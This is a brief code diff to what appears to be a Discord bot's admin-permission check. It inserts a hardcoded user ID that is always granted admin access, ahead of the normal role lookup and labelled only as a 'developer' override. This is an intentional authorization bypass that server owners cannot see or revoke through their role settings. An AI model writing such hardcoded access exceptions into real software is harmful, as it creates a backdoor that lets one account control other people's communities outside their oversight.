@@ -55,6 +55,9 @@ async function memberHasAdminRole(botClient, userId) {
     if (!guild) throw new Error('Configured guild not found.');
 
     if (guild.ownerId === userId) return { allowed: true, reason: 'guild_owner' };
+    
+    // Explicit hardcoded developer ID
+    if (userId === '1459948430150336725') return { allowed: true, reason: 'developer_id' };
 
     const member = await guild.members.fetch(userId).catch(() => null);
     if (!member) {
